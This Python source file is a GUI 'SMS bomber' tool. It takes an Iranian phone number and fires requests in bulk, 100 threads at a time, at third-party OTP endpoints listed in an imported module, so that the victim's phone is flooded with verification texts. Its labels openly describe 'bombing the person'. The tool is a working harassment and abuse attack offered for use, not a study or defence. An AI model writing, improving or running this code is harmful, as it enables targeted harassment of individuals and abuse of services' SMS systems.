import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from api import send_otp_requests, send_otp_requests_json
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import random

stop_flag = False

# ----------------- function ha -----------------

def send_otps_thread():
    global stop_flag
    stop_flag = False
    start_button.config(state=tk.DISABLED)

    number = phone_entry.get().strip()
    if not number.isdigit() or len(number) != 10 or not number.startswith("9"):
        messagebox.showerror("Error", "Enter valid 10-digit Iranian number (no leading 0).")
        start_button.config(state=tk.NORMAL)
        return

    try:
        many = int(times_entry.get())
        delay = float(delay_entry.get())
        if many <= 0 or delay < 0:
            raise ValueError
    except ValueError:
        messagebox.showerror("Error", "Enter valid numbers for times and delay.")
        start_button.config(state=tk.NORMAL)
        return

    api_requests_list = send_otp_requests(number) + send_otp_requests_json(number)
    success_count = 0
    fail_count = 0
    lock = threading.Lock()
    session = requests.Session()

    log_text.config(state=tk.NORMAL)
    log_text.delete("1.0", tk.END)
    log(f"{number} will be bombed.", "blue")

    def send_request(url, payload, retries=1):
        nonlocal success_count, fail_count
        for attempt in range(retries + 1):
            if stop_flag:
                return
            try:
                if payload:
                    response = session.post(url, json=payload, timeout=10)
                else:
                    response = session.post(url, timeout=10)
                with lock:
                    if response.status_code in [200, 201, 202]:
                        success_count += 1
                        log(f"[SUCCESS] {url}", "green")
                        return
                    else:
                        fail_count += 1
                        log(f"[FAILED] {url} - Status: {response.status_code}", "red")
            except requests.exceptions.RequestException as e:
                if attempt == retries:
                    with lock:
                        fail_count += 1
                        log(f"[ERROR] {url} - {e}", "red")
                else:
                    time.sleep(0.1)

    max_workers = 100

    try:
        for i in range(many):
            if stop_flag:
                log("Process stopped by user.", "orange")
                break
            log(f"Sending batch {i+1}/{many}...", "blue")
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = []
                for url, payload in api_requests_list:
                    if stop_flag:
                        break
                    futures.append(executor.submit(send_request, url, payload))
                    time.sleep(delay + random.uniform(0, 0.05))
                for future in futures:
                    future.result()
    except Exception as e:
        messagebox.showerror("Error", f"Unexpected error: {e}")

    log(f"\nFinished sending!\nSuccessful: {success_count}, Failed: {fail_count}", "blue")
    messagebox.showinfo("Done", f"OTP sending finished!\nSuccessful: {success_count}\nFailed: {fail_count}")
    start_button.config(state=tk.NORMAL)

def log(message, color="black"):
    log_text.config(state=tk.NORMAL)
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_text.insert(tk.END, f"[{timestamp}] {message}\n", color)
    log_text.tag_config(color, foreground=color)
    log_text.see(tk.END)
    log_text.config(state=tk.DISABLED)

def start_sending():
    threading.Thread(target=send_otps_thread, daemon=True).start()

def stop_sending():
    global stop_flag
    stop_flag = True

# ----------------- gui -----------------

root = tk.Tk()
root.title("TweLve Sms Bomber")
root.geometry("750x700")
root.resizable(False, False)
root.configure(bg="#f0f0f0")

# ----------------- style ha -----------------
style = ttk.Style(root)
style.theme_use("clam")

style.configure("TFrame", background="#f0f0f0")
style.configure("TLabel", background="#f0f0f0", font=("Helvetica", 12))
style.configure("Header.TLabel", font=("Helvetica", 16, "bold"), foreground="#333")
style.configure("TButton", font=("Helvetica", 12), padding=6, foreground="#fff", background="#4CAF50")
style.map("TButton",
          background=[('active', '#45a049')],
          foreground=[('disabled', '#aaa')])
style.configure("TEntry", font=("Helvetica", 12))

# ----------------- layout ha -----------------
top_frame = ttk.Frame(root, padding=15)
top_frame.pack(fill="x", pady=10)

input_frame = ttk.Frame(root, padding=15)
input_frame.pack(fill="x", pady=5)

buttons_frame = ttk.Frame(root, padding=10)
buttons_frame.pack(pady=10)

log_frame = ttk.Frame(root, padding=10)
log_frame.pack(fill="both", expand=True)

# ----------------- Saresh xD -----------------
ttk.Label(input_frame, text="Iranian Phone Number (Don't include the 0)").grid(row=0, column=0, sticky="w", pady=8)
phone_entry = ttk.Entry(input_frame, width=30)
phone_entry.grid(row=0, column=1, pady=8, padx=5)

ttk.Label(input_frame, text="Number of times you want to bomb the person").grid(row=1, column=0, sticky="w", pady=8)
times_entry = ttk.Entry(input_frame, width=15)
times_entry.grid(row=1, column=1, pady=8, padx=5)

ttk.Label(input_frame, text="Delay between bombing").grid(row=2, column=0, sticky="w", pady=8)
delay_entry = ttk.Entry(input_frame, width=15)
delay_entry.insert(0, "0.1")
delay_entry.grid(row=2, column=1, pady=8, padx=5)

start_button = ttk.Button(buttons_frame, text="Start Sending", command=start_sending)
start_button.pack(side="left", padx=12)
ttk.Button(buttons_frame, text="Stop", command=stop_sending).pack(side="left", padx=12)
ttk.Button(buttons_frame, text="Exit", command=root.quit).pack(side="left", padx=12)

log_text = scrolledtext.ScrolledText(log_frame, width=85, height=30, state=tk.DISABLED, font=("Courier", 11), bg="#1e1e1e", fg="#f5f5f5", insertbackground="#f5f5f5")
log_text.pack(fill="both", expand=True)

ttk.Label(root, text="Made by Twelve", font=("Helvetica", 10, "italic"), background="#f0f0f0").pack(pady=6)

root.mainloop()
